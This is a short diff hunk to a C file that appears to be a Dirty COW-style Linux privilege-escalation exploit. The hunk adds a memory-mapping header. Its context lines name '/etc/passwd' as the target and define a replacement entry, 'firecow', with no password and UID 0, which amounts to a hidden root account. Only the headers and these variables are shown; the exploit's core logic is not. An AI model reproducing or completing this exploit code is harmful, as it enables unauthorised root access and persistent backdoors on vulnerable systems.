@@ -4,6 +4,7 @@
 #include <string.h>
 #include <stdio.h>
 #include <unistd.h>
+#include <sys/mman.h> 
  
 char *target = "/etc/passwd";
 char backup[] = "firecow::0:0:root:/root:/bin/bash\n";
